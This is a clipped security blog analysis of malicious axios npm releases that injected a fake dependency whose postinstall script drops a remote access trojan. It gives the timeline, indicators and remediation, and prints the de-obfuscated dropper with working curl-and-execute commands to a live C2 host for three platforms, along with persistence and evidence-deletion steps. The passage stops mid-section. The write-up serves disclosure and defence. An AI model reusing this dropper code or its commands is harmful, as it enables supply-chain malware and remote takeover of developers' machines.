---
title: "Axios Compromised on NPM – Malicious Versions Drop Remote Access Trojan"
url: https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan
clipped: 2026-06-17 01:24:49
source: "HackerNews Digest"
tags:
  - hn-digest
  - clipping
---

# [Axios Compromised on NPM – Malicious Versions Drop Remote Access Trojan](https://www.stepsecurity.io/blog/axios-compromised-on-npm-malicious-versions-drop-remote-access-trojan)

## Digest Summary
StepSecurity discovered two compromised axios releases (axios @1.14.1 and axios @0.30.4) published on 31 Mar 2026 using a hijacked maintainer account (jasonsaayman → [email protected]). The attacker added a malicious dependency, plain‑crypto‑js @4.2.1, which contains a postinstall script (setup.js) that drops a cross‑platform remote‑access trojan (RAT). The trojan contacts C2 server sfrclak.com:8000/6202033 and delivers platform‑specific payloads: an AppleScript‑based binary on macOS (saved to /Library/Caches/com.apple.act.mond), a PowerShell script on Windows (saved to %PROGRAMDATA%\wt.exe) and a Python script on Linux (saved to /tmp/ld.py). After execution the dropper self‑deletes, replaces its package.json with a clean stub, and removes its own files to evade detection.  

**Indicators of compromise**  
- Malicious package shasums: axios @1.14.1 (2553649f…), axios @0.30.4 (d6f3f62…), plain‑crypto‑js @4.2.1 (07d889e2…).  
- Network: C2 domain sfrclak.com (IP 142.11.206.73).  
- Files: /Library/Caches/com.apple.act.mond, %PROGRAMDATA%\wt.exe, /tmp/ld.py.  

**Remediation**  
- Downgrade to safe versions (axios @1.14.0 or @0.30.3).  
- Remove plain‑crypto‑js, reinstall with --ignore-scripts, and add overrides/resolutions to lock versions.  
- Rotate all secrets, block C2 traffic, and treat affected systems as fully compromised.

## Discussion Summary
The comments express strong concern about the security of package managers, highlighting a recent incident where compromised credentials were used to publish malicious versions of a popular library. Users question the effectiveness of existing safeguards such as two‑factor authentication, suggest longer update windows to mitigate risk, and note growing mistrust of npm and similar ecosystems. Some indicate a preference for alternative languages they perceive as better protected, reflecting broader anxiety about supply‑chain vulnerabilities.

---

## Full Article

Read the full behind-the-scenes story of how StepSecurity detected and helped remediate this attack: [Behind the Scenes: How StepSecurity Detected and Helped Remediate the Largest npm Supply Chain Attack](https://www.stepsecurity.io/blog/behind-the-scenes-how-stepsecurity-detected-and-helped-remediate-the-largest-npm-supply-chain-attack)

axios is the most popular JavaScript HTTP client library with over 100 million weekly downloads. On March 30, 2026, StepSecurity identified two malicious versions of the widely used `axios` HTTP client library published to npm: `axios@1.14.1` and `axios@0.30.4`. The malicious versions inject a new dependency, `plain-crypto-js@4.2.1`, which is never imported anywhere in the axios source code. Its sole purpose is to execute a `postinstall` script that acts as a cross platform remote access trojan (RAT) dropper, targeting macOS, Windows, and Linux. The dropper contacts a live command and control server and delivers platform specific second stage payloads. After execution, the malware deletes itself and replaces its own `package.json` with a clean version to evade forensic detection.

**If you have installed axios@1.14.1 or axios@0.30.4, assume your system is compromised**

There are zero lines of malicious code inside axios itself, and that's exactly what makes this attack so dangerous. Both poisoned releases inject a fake dependency, `plain-crypto-js@4.2.1`, a package never imported anywhere in the axios source, whose sole purpose is to run a postinstall script that deploys a cross-platform remote access trojan. The dropper contacts a live command-and-control server, delivers separate second-stage payloads for macOS, Windows, and Linux, then erases itself and replaces its own `package.json` with a clean decoy. A developer who inspects their `node_modules` folder after the fact will find no indication anything went wrong.

This was not opportunistic. It was precision. The malicious dependency was staged 18 hours in advance. Three payloads were pre-built for three operating systems. Both release branches were poisoned within 39 minutes of each other. Every artifact was designed to self-destruct. Within two seconds of `npm install`, the malware was already calling home to the attacker's server before npm had even finished resolving dependencies. This is among the most operationally sophisticated supply chain attacks ever documented against a top-10 npm package.

These compromises were detected by StepSecurity AI Package Analyst [[1](https://app.stepsecurity.io/oss-security-feed/axios?version=0.30.4)][[2](https://app.stepsecurity.io/oss-security-feed/axios?version=1.14.1)] and [StepSecurity Harden-Runner.](https://github.com/step-security/harden-runner) We have [responsibly disclosed](https://github.com/axios/axios/issues/10604) the issue to the project maintainers.

StepSecurity Harden-Runner, whose community tier is free for public repos and is used by over 12,000 public repositories, detected the compromised axios package making anomalous outbound connections to the attacker's C2 domain across multiple open source projects. For example, Harden-Runner flagged the C2 callback to sfrclak.com:8000 during a routine CI run in the backstage repository, one of the most widely used developer portal frameworks. The Backstage team has confirmed that this workflow is intentionally sandboxed and the malicious package install does not impact the project. The connection was automatically marked as anomalous because it had never appeared in any prior workflow run. Harden-Runner insights for community tier projects are public by design, allowing anyone to verify the detection: <https://app.stepsecurity.io/github/backstage/backstage/actions/runs/23775668703?tab=network-events>

[Community Webinar] axios Compromised on npm: What We Know, What You Should Do

Watch the StepSecurity community briefing on the axios supply chain attack. We walk through the full attack chain, indicators of compromise, remediation steps, and answer community questions.

[Watch the recording on YouTube →](https://youtu.be/3Hku_svFvos)

Attack Timeline
---------------

The attack was pre-staged across roughly 18 hours, with the malicious dependency seeded on npm before the axios releases to avoid “brand-new package” alarms from security scanners:

| Timestamp (UTC) | Event |
| --- | --- |
| 2026-03-30 05:57 | `plain-crypto-js@4.2.0` published by `nrwise@proton.me` — a clean decoy containing a full copy of the legitimate `crypto-js` source, no `postinstall` hook. Its sole purpose is to establish npm publishing history so the package does not appear as a zero-history account during later inspection. |
| 2026-03-30 23:59 | `plain-crypto-js@4.2.1` published by `nrwise@proton.me` — malicious payload added. The `postinstall: "node setup.js"` hook and obfuscated dropper are introduced. |
| 2026-03-31 00:21 | `axios@1.14.1` published by compromised `jasonsaayman` account (email: `ifstap@proton.me`) — injects `plain-crypto-js@4.2.1` as a runtime dependency, targeting the modern 1.x user base. |
| 2026-03-31 01:00 | `axios@0.30.4` published by the same compromised account — identical injection into the legacy 0.x branch, published 39 minutes later to maximize coverage across both release lines. |
| 2026-03-31 ~03:15 | npm unpublishes `axios@1.14.1` and `axios@0.30.4`. Both versions are removed from the registry and the `latest` dist-tag reverts to `1.14.0`. `axios@1.14.1` had been live for approximately 2 hours 53 minutes; `axios@0.30.4` for approximately 2 hours 15 minutes. Timestamp is inferred from the axios registry document's `modified` field (03:15:30Z) — npm does not expose a dedicated per-version unpublish timestamp in its public API. |
| 2026-03-31 03:25 | npm initiates a security hold on `plain-crypto-js`, beginning the process of replacing the malicious package with an npm security-holder stub. |
| 2026-03-31 04:26 | npm publishes the security-holder stub `plain-crypto-js@0.0.1-security.0` under the `npm@npmjs.com` account, formally replacing the malicious package on the registry. `plain-crypto-js@4.2.1` had been live for approximately 4 hours 27 minutes. Attempting to install any version of `plain-crypto-js` now returns the security notice. |

How the Attack Works
--------------------

### Step 1 - Maintainer Account Hijack

The attacker compromised the `jasonsaayman` npm account, the primary maintainer of the axios project. The account’s registered email was changed to `ifstap@proton.me` — an attacker-controlled ProtonMail address. Using this access, the attacker published malicious builds across both the 1.x and 0.x release branches simultaneously, maximizing the number of projects exposed.

Both `axios@1.14.1` and `axios@0.30.4` are recorded in the npm registry as published by `jasonsaayman`, making them indistinguishable from legitimate releases at a glance. Both versions were published using the compromised npm credentials of a lead axios maintainer, bypassing the project's normal GitHub Actions CI/CD pipeline.

A critical forensic signal is visible in the npm registry metadata. Every legitimate axios 1.x release is published via GitHub Actions with npm’s OIDC Trusted Publisher mechanism, meaning the publish is cryptographically tied to a verified GitHub Actions workflow. `axios@1.14.1` breaks that pattern entirely — published manually via a stolen npm access token with no OIDC binding and no `gitHead`:

```
// axios@1.14.0 — LEGITIMATE
"_npmUser": {
  "name": "GitHub Actions",
  "email": "npm-oidc-no-reply@github.com",
  "trustedPublisher": {
    "id": "github",
    "oidcConfigId": "oidc:9061ef30-3132-49f4-b28c-9338d192a1a9"
  }
}

// axios@1.14.1 — MALICIOUS
"_npmUser": {
  "name": "jasonsaayman",
  "email": "ifstap@proton.me"
  // no trustedPublisher, no gitHead, no corresponding GitHub commit or tag
}
```

There is no commit or tag in the axios GitHub repository that corresponds to `1.14.1`. The release exists only on npm. The OIDC token that legitimate releases use is ephemeral and scoped to the specific workflow — it cannot be stolen. The attacker must have obtained a long-lived classic npm access token for the account.

### Step 2 - Staging the Malicious Dependency

Before publishing the malicious axios versions, the attacker pre-staged `plain-crypto-js@4.2.1` from account `nrwise@proton.me`. This package:

* Masquerades as `crypto-js` with an identical description and repository URL pointing to the legitimate `brix/crypto-js` GitHub repository
* Contains `"postinstall": "node setup.js"` — the hook that fires the RAT dropper on install
* Pre-stages a clean `package.json` stub in a file named `package.md` for evidence destruction after execution

The decoy version (`4.2.0`) was published 18 hours earlier to establish publishing history - a clean package in the registry that makes `nrwise` look like a legitimate maintainer.

### plain-crypto-js: Complete Package Anatomy

#### What changed between 4.2.0 (decoy) and 4.2.1 (malicious)

A complete file-level comparison between `plain-crypto-js@4.2.0` and `plain-crypto-js@4.2.1` reveals exactly three differences. Every other file (all 56 crypto source files, the README, the LICENSE, and the docs) is identical between the two versions:

| File | In 4.2.0 | In 4.2.1 | Change |
| --- | --- | --- | --- |
| `package.json` | no `scripts` section | `"postinstall": "node setup.js"` added | Modified: weapon added |
| `setup.js` | Not present | 4.2 KB obfuscated dropper | **Added: the RAT dropper** |
| `package.md` | Not present | Clean JSON stub reporting version `4.2.0` | **Added: the anti-forensics cover** |

The 56 crypto source files are not just similar; they are **bit-for-bit identical** to the corresponding files in the legitimate `crypto-js@4.2.0` package published by Evan Vosberg. The attacker made no modifications to the cryptographic library code whatsoever. This was intentional: any diff-based analysis comparing `plain-crypto-js` against `crypto-js` would find nothing suspicious in the library files and would focus attention on `package.json` — where the `postinstall` hook looks, at a glance, like a standard build or setup task.

#### The version spoofing trick in `package.md`

The anti-forensics stub (`package.md`) deserves particular attention. After `setup.js` runs, it renames `package.md` to `package.json`. The stub reports version `4.2.0` — not `4.2.1`:

```
// Contents of package.md (the clean replacement stub)
{
  "name": "plain-crypto-js",
  "version": "4.2.0",    // ← reports 4.2.0, not 4.2.1 — deliberate mismatch
  "description": "JavaScript library of crypto standards.",
  "license": "MIT",
  "author": { "name": "Evan Vosberg", "url": "http://github.com/evanvosberg" },
  "homepage": "http://github.com/brix/crypto-js",
  "repository": { "type": "git", "url": "http://github.com/brix/crypto-js.git" },
  "main": "index.js",
  // No "scripts" key — no postinstall, no test
  "dependencies": {}
}
```

This creates a secondary deception layer. After infection, running `npm list` in the project directory will report `plain-crypto-js@4.2.0` — because `npm list` reads the `version` field from the installed `package.json`, which now says `4.2.0`. An incident responder checking installed packages would see a version number that does not match the malicious `4.2.1` version they were told to look for, potentially leading them to conclude the system was not compromised.

```
$ npm list plain-crypto-js
myproject@1.0.0
└── plain-crypto-js@4.2.0   
                               


$ ls node_modules/plain-crypto-js
aes.js  cipher-core.js  core.js  ...
```

The difference between the real `crypto-js@4.2.0` and the malicious `plain-crypto-js@4.2.1` is a single field in `package.json`:

```
// crypto-js@4.2.0  (LEGITIMATE — Evan Vosberg / brix)
{
  "name": "crypto-js",
  "version": "4.2.0",
  "description": "JavaScript library of crypto standards.",
  "author": "Evan Vosberg",
  "homepage": "http://github.com/brix/crypto-js",
  "scripts": {
    "test": "grunt"             // ← no postinstall
  }
}

// plain-crypto-js@4.2.1  (MALICIOUS — nrwise@proton.me)
{
  "name": "plain-crypto-js",   // ← different name, everything else cloned
  "version": "4.2.1",          // ← version one ahead of the real package
  "description": "JavaScript library of crypto standards.",
  "author": { "name": "Evan Vosberg" },   // ← fraudulent use of real author name
  "homepage": "http://github.com/brix/crypto-js",  // ← real repo, wrong package
  "scripts": {
    "test": "grunt",
    "postinstall": "node setup.js"   // ← THE ONLY DIFFERENCE. The entire weapon.
  }
}
```

‍

### Step 3 - Injecting the Dependency into axios

The attacker published `axios@1.14.1` and `axios@0.30.4` with `plain-crypto-js: "^4.2.1"` added as a runtime dependency — a package that has never appeared in any legitimate axios release. The diff is surgical: every other dependency is identical to the prior clean version.

Dependency comparison between clean and compromised versions:

* axios@1.14.0 — follow-redirects, form-data, proxy-from-env [CLEAN]
* axios@1.14.1 — follow-redirects, form-data, proxy-from-env, plain-crypto-js@^4.2.1 [**MALICIOUS**]
* axios@0.30.3 — follow-redirects, form-data, proxy-from-env [CLEAN]
* axios@0.30.4 — follow-redirects, form-data, proxy-from-env, plain-crypto-js@^4.2.1 [**MALICIOUS**]

When a developer runs `npm install axios@1.14.1`, npm resolves the dependency tree and installs `plain-crypto-js@4.2.1` automatically. npm then executes `plain-crypto-js`’s `postinstall` script, launching the dropper.

**Phantom dependency:** A grep across all 86 files in `axios@1.14.1` confirms that `plain-crypto-js` is never imported or `require()`’d anywhere in the axios source code. It is added to `package.json` only to trigger the `postinstall` hook. A dependency that appears in the manifest but has zero usage in the codebase is a high-confidence indicator of a compromised release.

### The Surgical Precision of the Injection

A complete binary diff between `axios@1.14.0` and `axios@1.14.1` across all 86 files (excluding source maps) reveals that **exactly one file changed**: `package.json`. Every other file — all 85 library source files, type definitions, README, CHANGELOG, and compiled dist bundles — is bit-for-bit identical between the two versions.

```
# File diff: axios@1.14.0 vs axios@1.14.1 (86 files, source maps excluded)
DIFFERS: package.json
Total differing files: 1

Files only in 1.14.1: (none)
Files only in 1.14.0: (none)
```

The complete `package.json` diff:

```
# --- axios/package.json (1.14.0)
# +++ axios/package.json (1.14.1)
- "version": "1.14.0",
+ "version": "1.14.1",
  "scripts": {
    "fix": "eslint --fix lib/**/*.js",
-   "prepare": "husky"
  },
  "dependencies": {
    "follow-redirects": "^2.1.0",
    "form-data": "^4.0.1",
    "proxy-from-env": "^2.1.0",
+   "plain-crypto-js": "^4.2.1"
  }
```

Two changes are visible: the version bump (`1.14.0 → 1.14.1`) and the addition of `plain-crypto-js`. There is also a third, less obvious change: the `"prepare": "husky"` script was removed. `husky` is the git hook manager used by the axios project to enforce pre-commit checks. Its removal from the `scripts` section is consistent with a manual publish that bypassed the normal development workflow — the attacker edited `package.json` directly without going through the project's standard release tooling, which would have re-added the husky prepare script.

The same analysis applies to `axios@0.30.3 → axios@0.30.4`:

```
# --- axios/package.json (0.30.3)
# +++ axios/package.json (0.30.4)
- "version": "0.30.3",
+ "version": "0.30.4",
  "dependencies": {
    "follow-redirects": "^1.15.4",
    "form-data": "^4.0.4",
    "proxy-from-env": "^1.1.0",
+   "plain-crypto-js": "^4.2.1"
  }
```

Again — exactly one substantive change: the malicious dependency injection. The version bump itself (from `0.30.3` to `0.30.4`) is simply the required npm version increment to publish a new release; it carries no functional significance.

‍

### The RAT Dropper: `setup.js` - Static Analysis

`setup.js` is a single minified file employing a two-layer obfuscation scheme designed to evade static analysis tools and confuse human reviewers.

#### Obfuscation Technique

All sensitive strings — module names, OS identifiers, shell commands, the C2 URL, and file paths — are stored as encoded values in an array named `stq[]`. Two functions decode them at runtime:

**`_trans_1(x, r)`** — XOR cipher. The key `"OrDeR_7077"` is parsed through JavaScript’s `Number()`: alphabetic characters produce `NaN`, which in bitwise operations becomes `0`. Only the digits `7`, `0`, `7`, `7` in positions 6–9 survive, giving an effective key of `[0,0,0,0,0,0,7,0,7,7]`. Each character at position `r` is decoded as:

```
charCode XOR key[(7 × r × r) % 10] XOR 333
```

‍

**`_trans_2(x, r)`** — Outer layer. Reverses the encoded string, replaces `_` with `=`, base64-decodes the result (interpreting the bytes as UTF-8 to recover Unicode code points), then passes the output through `_trans_1`.

The dropper’s entry point is `_entry("6202033")`, where `6202033` is the C2 URL path segment. The full C2 URL is: **`http://sfrclak.com:8000/6202033`**

#### Fully Decoded Strings

StepSecurity fully decoded every entry in the `stq[]` array. The recovered plaintext reveals the complete attack:

```
stq[0]  → "child_process"          // shell execution
stq[1]  → "os"                      // platform detection
stq[2]  → "fs"                      // filesystem operations
stq[3]  → "http://sfrclak.com:8000/"   // C2 base URL
stq[5]  → "win32"                   // Windows platform identifier
stq[6]  → "darwin"                  // macOS platform identifier
stq[12] → "curl -o /tmp/ld.py -d packages.npm.org/product2 -s SCR_LINK && nohup python3 /tmp/ld.py SCR_LINK > /dev/null 2>&1 &"
stq[13] → "package.json"            // deleted after execution
stq[14] → "package.md"              // clean stub renamed to package.json
stq[15] → ".exe"
stq[16] → ".ps1"
stq[17] → ".vbs"
```

The complete attack path from `npm install` to C2 contact and cleanup, across all three target platforms.

### Full Annotated Walkthrough of `setup.js`

With all strings decoded, the dropper's full logic can be reconstructed and annotated. The following is a de-obfuscated, commented version of the `_entry()` function that constitutes the entire dropper payload. Original variable names are preserved; comments are added for clarity.

```
// setup.js — de-obfuscated and annotated
// SHA-256: e10b1fa84f1d6481625f741b69892780140d4e0e7769e7491e5f4d894c2e0e09

const _entry = function(campaignId) {
  try {
    // Load Node.js built-in modules via decoded string table
    const fs      = require("fs");           // stq[2]
    const os      = require("os");           // stq[1]
    const { execSync } = require("child_process"); // stq[0]

    // Build the full C2 URL: base + campaign ID
    // stq[3] = "http://sfrclak.com:8000/"
    const c2Url   = "http://sfrclak.com:8000/" + campaignId;
    // → "http://sfrclak.com:8000/6202033"

    // Detect the operating system
    const platform = os.platform();  // "darwin", "win32", or other
    const tmpDir   = os.tmpdir();     // "/tmp" on Linux/macOS, "%TEMP%" on Windows

    // os.type(), os.release(), os.arch() are called but results discarded —
    // likely sends them via the POST body or they are used in the stage-2
    os.type(); os.release(); os.arch();

    let execCommand = "";

    // ─────────────────────────────────────────────────
    // BRANCH 1: macOS (darwin)
    // ─────────────────────────────────────────────────
    if (platform === "darwin") {
      const scriptPath = tmpDir + "/" + campaignId;   // /tmp/6202033

      const appleScript = `
    set {a, s, d} to {"", "${c2Url}", "/Library/Caches/com.apple.act.mond"}
        try
            do shell script "curl -o " & d & a & " -d packages.npm.org/product0" & " -s " & s & " && chmod 770 " & d & " && /bin/zsh -c \\"" & d & " " & s & " &\\" &> /dev/null"
        end try
    do shell script "rm -rf ${scriptPath}"`;

      fs.writeFileSync(scriptPath, appleScript);
      execCommand = `nohup osascript "${scriptPath}" > /dev/null 2>&1 &`;

    // ─────────────────────────────────────────────────
    // BRANCH 2: Windows (win32)
    // ─────────────────────────────────────────────────
    } else if (platform === "win32") {

      const psPath = execSync("where powershell").toString().trim();

      const wtPath = process.env.PROGRAMDATA + "\\wt.exe";
      if (!fs.existsSync(wtPath)) {
        fs.copyFileSync(psPath, wtPath);
        // Creates a persistent copy of PowerShell. wt.exe is Windows Terminal's
        // binary name — a legitimate-looking process in %PROGRAMDATA%.
      }

      const ps1Path = tmpDir + "\\" + campaignId + ".ps1";  // %TEMP%\6202033.ps1
      const vbsPath = tmpDir + "\\" + campaignId + ".vbs";  // %TEMP%\6202033.vbs

      const vbScript = `
    Set objShell = CreateObject("WScript.Shell")
    objShell.Run "cmd.exe /c curl -s -X POST -d ""packages.npm.org/product1"" ""${c2Url}"" > ""${ps1Path}"" & ""${wtPath}"" -w hidden -ep bypass -file ""${ps1Path}"" ""${c2Url}"" & del ""${ps1Path}"" /f", 0, False`;

      fs.writeFileSync(vbsPath, vbScript);
      execCommand = `cscript "${vbsPath}" //nologo && del "${vbsPath}" /f`;

    // ─────────────────────────────────────────────────
    // BRANCH 3: Linux / other
    // ─────────────────────────────────────────────────
    } else {
      execCommand = `curl -o /tmp/ld.py -d packages.npm.org/product2 -s ${c2Url} && nohup python3 /tmp/ld.py ${c2Url} > /dev/null 2>&1 &`;
      // curl and nohup chained with &&: nohup only runs if curl succeeded.
      // If the C2 is unreachable, chain silently fails — npm install still exits 0.
    }

    // execSync is blocking, but all three commands return immediately because
    // the real work is detached to background processes (nohup / cscript 0,False)
    execSync(execCommand);

    // ─────────────────────────────────────────────────
    // ANTI-FORENSICS: cover tracks
    // ─────────────────────────────────────────────────
    const selfPath = __filename;

    fs.unlink(selfPath, () => {});         // 1. Delete setup.js itself
    fs.unlink("package.json", () => {});   // 2. Delete malicious package.json
    fs.rename("package.md", "package.json", () => {}); // 3. Install clean v4.2.0 stub

  } catch(e) {
    // Silent catch — any error (C2 unreachable, permission denied, etc.)
    // is swallowed completely. npm install always exits with code 0.
    // The developer never sees any indication that anything went wrong.
  }
};

// Entry point — "6202033" is the campaign/tracking ID
_entry("6202033");
```

#### Critical design details

1. Silent failure via top-level `try/catch`. The entire `_entry()` function is wrapped in a single `try/catch` that swallows all errors with an empty handler. If the C2 is unreachable, if the user has no write permission to the target path, or if any step fails, the dropper exits silently and `npm install` completes with exit code `0`. There is no error output, no warning, nothing.
2. `execSync` is blocking, but the payloads are not. The dropper uses `execSync(execCommand)` — a synchronous, blocking call. However, all three platform execution commands end with `&` (Linux/macOS) or use `cscript ... 0, False` (Windows), which immediately detach the process and return. So `execSync` returns almost instantly — the dropper doesn't block `npm install` for more than a fraction of a second.
3. The `&&` chain on Linux is a liveness check. `curl ... && nohup python3 ...` — if `curl` fails (C2 unreachable, no network), the `nohup` command never executes. This ensures `npm install` never fails, even when the C2 is unavailable.
4. The Windows `copyFileSync` conditional creates persistence. `if (!fs.existsSync(wtPath)) { fs.copyFileSync(psPath, wtPath); }` — the copy only runs if `%PROGRAMDATA%\wt.exe` does not already exist. Once created, this file persists across reinstalls and reboots. Even if the victim removes `plain-crypto-js` and reinstalls clean dependencies, `wt.exe` remains in `%PROGRAMDATA%` as a dormant copy of PowerShell available to any future payload.

### Platform-Specific Payloads

#### macOS — AppleScript Dropper

On macOS (`darwin`), the dropper writes an AppleScript to `/tmp/6202033` and executes it silently via `nohup osascript`. The AppleScript contacts C2 with POST body `packages.npm.org/product0`, downloads the macOS RAT binary, saves it to `/Library/Caches/com.apple.act.mond` (mimicking an Apple system cache file), makes it executable (`chmod 770`), and launches it via `/bin/zsh`. The script then deletes itself.

The name `com.apple.act.mond` likely abbreviates "Activity Monitor Daemon" to blend with legitimate Apple processes using Apple's reverse-DNS daemon naming convention.

#### Windows — VBScript + PowerShell Dropper

On Windows (`win32`):

1. Runs `where powershell` to locate the binary
2. Copies PowerShell to `%PROGRAMDATA%\wt.exe` (disguised as Windows Terminal)
3. Writes a VBScript (`.vbs`) to temp directory, executed via `cscript //nologo` in a hidden `cmd.exe` window
4. The VBScript runs `curl` to fetch the PowerShell stage-2 to `%TEMP%\6202033.ps1`, executes it with `-WindowStyle Hidden` and `-ExecutionPolicy Bypass`, then self-deletes

Persistent artifact: `%PROGRAMDATA%\wt.exe` (copy of PowerShell).

#### Linux — Python Dropper

On Linux and all other platforms:

```
curl -o /tmp/ld.py \
  -d packages.npm.org/product2 \
  -s http://sfrclak.com:8000/6202033 \
&& nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &
```

C2 returns a Python RAT script saved to `/tmp/ld.py` and executed in background, detached from the npm process tree.

### Complete Platform Payloads (Fully Resolved)

The following are the complete, fully resolved payloads as they execute on victim machines, with all template placeholders replaced with actual values using campaign ID `6202033` and C2 base URL `http://sfrclak.com:8000/`.

#### macOS — Full AppleScript written to `/tmp/6202033`

```
-- Written to: /tmp/6202033
-- Executed via: nohup osascript "/tmp/6202033" > /dev/null 2>&1 &
-- This file is deleted by the script itself in the final do shell script line

set {a, s, d} to {"", "http://sfrclak.com:8000/6202033", "/Library/Caches/com.apple.act.mond"}
    try
        do shell script "curl -o " & d & a & " -d packages.npm.org/product0" & " -s " & s & " && chmod 770 " & d & " && /bin/zsh -c \"" & d & " " & s & " &\" &> /dev/null"
    end try
do shell script "rm -rf /tmp/6202033"
```

When executed, this AppleScript expands to the following shell command:

```
curl -o /Library/Caches/com.apple.act.mond \
     -d packages.npm.org/product0 \
     -s http://sfrclak.com:8000/6202033 \
  && chmod 770 /Library/Caches/com.apple.act.mond \
  && /bin/zsh -c "/Library/Caches/com.apple.act.mond http://sfrclak.com:8000/6202033 &" \
  >& /dev/null
```

#### Windows — Full VBScript written to `%TEMP%\6202033.vbs`

```
' Written to: %TEMP%\6202033.vbs
' Executed via: cscript "%TEMP%\6202033.vbs" //nologo && del "%TEMP%\6202033.vbs" /f
' objShell.Run arg 2=0 (hidden window), arg 3=False (don't wait for completion)

Set objShell = CreateObject("WScript.Shell")
objShell.Run "cmd.exe /c curl -s -X POST -d ""packages.npm.org/product1"" ""http://sfrclak.com:8000/6202033"" > ""%TEMP%\6202033.ps1"" & ""powershell.exe"" -w hidden -ep bypass -file ""%TEMP%\6202033.ps1"" ""http://sfrclak.com:8000/6202033"" & del ""%TEMP%\6202033.ps1"" /f", 0, False
```

#### Linux — Direct `execSync` shell command

```
# Executed directly via execSync() in Node.js — no intermediate file
curl -o /tmp/ld.py \
     -d packages.npm.org/product2 \
     -s http://sfrclak.com:8000/6202033 \
  && nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033 > /dev/null 2>&1 &
```

The `&` at the end detaches `nohup` from the shell started by `execSync`, causing it to be re-parented to PID 1 (`init`) when that shell exits, as confirmed in the Harden-Runner process events where `nohup` (PID 2400) shows `ppid: 1`.

#### Platform detection and the "other" case

The dropper's `if/else if/else` chain covers `darwin`, `win32`, and everything else (Linux). There is no explicit check for `"linux"` — anything that is not macOS or Windows falls through to the Linux command. This means the dropper also targets **FreeBSD, Android (Node.js on Termux), and any other Unix-like system** where `curl` and `python3` are available. Container environments running Node.js are equally affected.

Each platform sends a distinct POST body to the same C2 endpoint:

* macOS: `packages.npm.org/product0`
* Windows: `packages.npm.org/product1`
* Linux: `packages.npm.org/product2`

The `packages.npm.org/` prefix attempts to make traffic appear as benign npm registry communication in network logs and SIEMs.

### Self-Cleanup - Hiding the Evidence

After launching the platform-specific payload, `setup.js` performs three forensic cleanup steps in sequence:

1. Deletes itself — `fs.unlink(__filename)` removes `setup.js` from `node_modules/plain-crypto-js/`
2. Deletes `package.json` — removes the file containing `"postinstall": "node setup.js"`
3. Renames `package.md` to `package.json` — the pre-staged clean stub (reporting version 4.2.0, no scripts) replaces the malicious manifest

Post-infection inspection of `node_modules/plain-crypto-js/package.json` shows a completely clean manifest. Running `npm audit` reveals nothing. The only persistent evidence is the existence of the `node_modules/plain-crypto-js/` directory itself — this package never appeared in any legitimate axios version.

Why the directory presence still matters: Even after cleanup, the existence of `node_modules/plain-crypto-js/` is sufficient evidence of compromise — this package is not a dependency of any legitimate axios version. If you find this directory, the dropper ran.

Runtime Execution Validation with StepSecurity Harden-Runner
------------------------------------------------------------

Static analysis of the obfuscated dropper told us *what* the malware intended to do. To confirm it actually executes as designed, we installed `axios@1.14.1` inside a GitHub Actions runner instrumented with [StepSecurity Harden-Runner](https://github.com/step-security/harden-runner) in audit mode. Harden-Runner captures every outbound network connection, every spawned process, and every file write at the kernel level — without interfering with execution in audit mode, giving us a complete ground-truth picture of what happens the moment `npm install` runs.

The full Harden-Runner insights for this run are publicly accessible:  
[app.stepsecurity.io/github/actions-security-demo/compromised-packages/actions/runs/23776116077](https://app.stepsecurity.io/github/actions-security-demo/compromised-packages/actions/runs/23776116077?jobName=install-axios-0-30-4&jobId=69278263439&tab=network-events)

### Network Events: C2 Contact Confirmed Across Two Workflow Steps

The network event log contains two outbound connections to `sfrclak.com:8000` — but what makes this particularly significant is when they occur:

* Step: Install axios 1.14.1 — 01:30:51Z    PID 2401 • `curl` → sfrclak.com:8000 • calledBy: infra
* Step: Verify axios import and version — 01:31:27Z    PID 2400 • `nohup` → sfrclak.com:8000 • calledBy: infra

Two things stand out immediately:

* The first C2 connection (`curl`, PID 2401) fires 1.1 seconds into the npm install — at `01:30:51Z`, just 2 seconds after `npm install` began at `01:30:49Z`. The `postinstall` hook triggered, decoded its strings, and was making an outbound HTTP connection to an external server before npm had finished resolving all dependencies.
* The second C2 connection (`nohup`, PID 2400) occurs 36 seconds later, in an entirely different workflow step — “Verify axios import and version.” The npm install step was long finished. The malware had persisted into subsequent steps, running as a detached background process. This is the stage-2 Python payload (`/tmp/ld.py`) making a callback — alive and independent of the process that spawned it.

**Why both connections show `calledBy: "infra"`:** When Harden-Runner can trace a network call to a specific Actions step through the runner process tree, it labels it `"runner"`. The `"infra"` label means the process making the connection could not be attributed to a specific step — because the dropper used `nohup ... &` to detach from the process tree. The process was deliberately orphaned to PID 1 (`init`), severing all parent-child relationships. This is the malware actively evading process attribution.

### Process Tree: The Full Kill Chain as Observed at Runtime

Harden-Runner captures every `execve` syscall. The raw process events reconstruct the exact execution chain from `npm install` to C2 contact:

```
PID 2366  bash /home/runner/work/_temp/***.sh                         [01:30:48.186Z]
  └─ PID 2380  env node npm install axios@1.14.1                      [01:30:49.603Z]
       └─ PID 2391  sh -c "node setup.js"                             [01:30:50.954Z]
            │  cwd: node_modules/plain-crypto-js  ← postinstall hook fires
            └─ PID 2392  node setup.js                                [01:30:50.955Z]
                 │  cwd: node_modules/plain-crypto-js
                 └─ PID 2399  /bin/sh -c "curl -o /tmp/ld.py \        [01:30:50.978Z]
                          -d packages.npm.org/product2 \
                          -s http://sfrclak.com:8000/6202033 \
                       && nohup python3 /tmp/ld.py \
                          http://sfrclak.com:8000/6202033 \
                          > /dev/null 2>&1 &"

PID 2401  curl -o /tmp/ld.py -d packages.npm.org/product2            [01:30:50.979Z]
          ppid: 2400  ← child of nohup

PID 2400  nohup python3 /tmp/ld.py http://sfrclak.com:8000/6202033   [01:31:27.732Z]
          ppid: 1  ← ORPHANED TO INIT — detached from npm process tree
```

‍

The process tree confirms the exact execution chain decoded statically from `setup.js`. Four levels of process indirection separate the original `npm install` from the C2 callback: `npm → sh → node → sh → curl/nohup`. The `nohup` process (PID 2400) reporting `ppid: 1` is the technical confirmation of the daemonization technique — by the time `npm install` returned successfully, a detached process was already running `/tmp/ld.py` in the background.

### File Events: The Evidence Swap Caught in Real Time

The file event log captures every file write by PID. The `plain-crypto-js/package.json` entry shows two writes from two different processes — directly confirming the anti-forensics technique described in static analysis:

```
File: node_modules/plain-crypto-js/package.json

  Write 1 — pid=2380 (npm install)     ts=01:30:50.905Z
             Malicious package.json written to disk during install.
             Contains: { "postinstall": "node setup.js" }

  Write 2 — pid=2392 (node setup.js)   ts=01:31:27.736Z  [+36s]
